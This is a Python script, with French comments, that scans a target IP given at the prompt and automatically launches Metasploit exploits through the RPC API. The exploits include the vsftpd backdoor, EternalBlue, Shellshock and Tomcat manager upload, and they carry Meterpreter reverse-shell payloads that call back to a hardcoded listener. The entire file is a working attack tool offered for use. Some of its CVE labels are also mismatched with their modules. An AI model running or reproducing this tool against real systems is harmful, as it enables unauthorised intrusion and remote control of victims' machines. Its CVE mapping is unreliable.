from pymetasploit3.msfrpc import MsfRpcClient
import socket
import json

# 📌 Configuration RPC Metasploit
MSF_PASSWORD = "toor"
MSF_PORT = 55553
MSF_USER = "msf"
LHOST = "192.168.37.133"  # ← à adapter
LPORT = 4444

# 📍 Correspondance ports → exploits Metasploit
EXPLOIT_MAP = {
    21: {
        "exploit": "exploit/unix/ftp/vsftpd_234_backdoor",
        "payload": "cmd/unix/interact",
        "cve": "CVE-2011-2523"
    },
    22: {
        "exploit": "auxiliary/scanner/ssh/ssh_version",
        "payload": "",
        "cve": "Information Gathering"
    },
    80: {
        "exploit": "exploit/unix/webapp/phpmyadmin_preg_replace",
        "payload": "php/meterpreter/reverse_tcp",
        "cve": "CVE-2014-6271"
    },
    443: {
        "exploit": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "payload": "linux/x86/meterpreter/reverse_tcp",
        "cve": "CVE-2014-6271"
    },
    445: {
        "exploit": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "cve": "CVE-2017-0144"
    },
    8080: {
        "exploit": "exploit/multi/http/tomcat_mgr_upload",
        "payload": "java/meterpreter/reverse_tcp",
        "cve": "CVE-2017-12615"
    },
    139: {
        "exploit": "exploit/windows/smb/psexec",
        "payload": "windows/meterpreter/reverse_tcp",
        "cve": "Requires Valid Credentials"
    }
}

# 🔎 Détection des ports ouverts sur la cible
def get_open_ports(ip):
    open_ports = []
    for port in EXPLOIT_MAP.keys():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
    return open_ports

# ⚔ Exécution des exploits sur la cible détectée
def run_exploits(ip):
    results = {
        "ip": ip,
        "open_ports": [],
        "exploits": []
    }

    try:
        client = MsfRpcClient(MSF_PASSWORD, server='127.0.0.1', port=MSF_PORT, username=MSF_USER)
    except Exception as e:
        results["error"] = f"Erreur de connexion RPC : {e}"
        print(json.dumps(results))
        return

    open_ports = get_open_ports(ip)
    results["open_ports"] = open_ports

    for port in open_ports:
        exploit_info = EXPLOIT_MAP.get(port)
        if not exploit_info:
            results["exploits"].append({
                "port": port,
                "status": "Aucun exploit défini"
            })
            continue

        exploit_module = exploit_info["exploit"]
        payload = exploit_info.get("payload", "")
        cve = exploit_info.get("cve", "")

        try:
            exploit = client.modules.use('exploit', exploit_module)
            exploit['RHOSTS'] = ip
            exploit['RPORT'] = port

            if payload:
                payload_mod = client.modules.use('payload', payload)
                payload_mod['LHOST'] = LHOST
                payload_mod['LPORT'] = LPORT
                result = exploit.execute(payload=payload_mod)
            else:
                result = exploit.execute()

            results["exploits"].append({
                "port": port,
                "exploit": exploit_module,
                "payload": payload,
                "cve": cve,
                "status": "Succès",
                "result": result
            })

        except Exception as err:
            results["exploits"].append({
                "port": port,
                "exploit": exploit_module,
                "payload": payload,
                "cve": cve,
                "status": f"Erreur : {str(err)}"
            })

    print(json.dumps(results))  # 👈 C'est ce qui est renvoyé dans le curl ou le frontend

# 🧪 Exécution directe depuis terminal
if __name__ == "__main__":
    cible = input("🔍 IP cible : ")
    run_exploits(cible)
